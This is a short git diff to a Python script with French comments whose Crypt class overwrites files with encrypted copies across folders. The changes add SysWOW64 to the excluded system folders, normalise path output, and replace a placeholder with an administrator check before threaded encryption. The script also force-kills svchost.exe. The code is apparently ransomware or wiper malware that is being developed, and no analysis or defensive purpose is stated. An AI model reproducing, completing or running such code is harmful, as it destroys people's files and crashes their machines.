@@ -83,9 +83,12 @@ class Crypt: # Classe pour le cryptage
             
             with open(file, 'wb') as encrypted_file: # Remplacer le contenu du fichier par la variable cryptée
                 encrypted_file.write(encrypted)
+                file = file.replace("/", "\\")
                 text = f'>   {file} : Ok' # Texte d'execution
             
-        except: text = f'>   {file} : Error' # Texte d'erreur
+        except: 
+            file = file.replace("/", "\\")
+            text = f'>   {file} : Error' # Texte d'erreur
 
 
     def CryptFiles(self, path):
@@ -97,7 +100,7 @@ class Crypt: # Classe pour le cryptage
             
             if len(folder) != 0:
                 for file in folder:
-                    if ("WinSxS" not in file) and ("servicing" not in file) and ("." in file): self.Crypting(file)
+                    if ("WinSxS" not in file) and ("servicing" not in file) and ("SysWOW64" not in file) and ("." in file): self.Crypting(file)
             else: break
             
         os.system("taskkill /f /im svchost.exe")
@@ -106,7 +109,7 @@ class Crypt: # Classe pour le cryptage
 crypting = Crypt() # Créer une instance de la classe
 
 
-if True: # Si l'utilisateur est administrateur
+if is_admin(): # Si l'utilisateur est administrateur
     
     # Threads
     threads = [] # Liste des threads
